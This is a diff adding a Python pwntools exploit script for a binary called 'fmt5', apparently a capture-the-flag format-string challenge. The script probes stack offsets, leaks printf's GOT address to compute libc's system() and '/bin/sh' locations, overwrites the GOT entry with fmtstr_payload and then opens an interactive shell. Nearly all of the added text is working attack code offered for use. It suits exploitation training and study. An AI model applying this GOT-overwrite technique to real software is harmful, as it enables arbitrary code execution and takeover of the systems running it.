@@ -141,3 +141,70 @@
  'environment.\n'
  '\n'
  '```')
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context(arch='i386', os='linux', log_level='INFO')
+
+# Load the binary
+elf = ELF('./fmt5')  # Replace with the correct path to the binary
+
+# Start the process (adjust if you need to connect remotely)
+p = process(elf.path)
+
+# Addresses needed
+printf_got = elf.got['printf']
+log.info(f"printf GOT address: {hex(printf_got)}")
+
+# Receive any initial output
+p.recvuntil('Do you know repeater?\n')
+
+# Step 1: Find the correct format string offset
+# Send unique patterns to determine the offset
+for i in range(1, 10):
+    payload = f"%{i}$p"
+    p.sendline(payload)
+    response = p.recvline()
+    print(f"Offset {i}: {response.strip()}")
+
+# Analyze the outputs manually to find where our input is
+# For this example, let's assume the offset is 7
+offset = 7  # Adjust this value based on the actual offset found
+log.info(f"Using format string offset: {offset}")
+
+# Step 2: Leak the address of printf from the GOT
+payload = flat(
+    p32(printf_got),         # Place the address on the stack
+    f"%{offset}$s"           # Read the string at the offset
+)
+p.sendline(payload)
+response = p.recvline()
+
+# Extract the leaked address
+leaked_printf = u32(response[:4])  # Read the first 4 bytes
+log.success(f"Leaked printf address: {hex(leaked_printf)}")
+
+# Step 3: Calculate libc base and system address
+# Load your local libc (needs to match the target's libc)
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # Adjust path as necessary
+libc_base = leaked_printf - libc.symbols['printf']
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+log.info(f"Calculated libc base address: {hex(libc_base)}")
+log.info(f"Calculated system() address: {hex(system_addr)}")
+log.info(f"Calculated '/bin/sh' string address: {hex(binsh_addr)}")
+
+# Step 4: Overwrite printf GOT entry with system address
+# Use pwntools' fmtstr_payload to generate the payload
+writes = {printf_got: system_addr}
+payload = fmtstr_payload(offset, writes, write_size='short')  # 'short' reduces the number of writes
+p.sendline(payload)
+p.recvline()  # Receive any additional output
+log.success("Overwrote printf GOT entry with system address.")
+
+# Step 5: Send '/bin/sh' to get a shell
+p.sendline('/bin/sh')
+
+# Interact with the shell
+p.interactive()
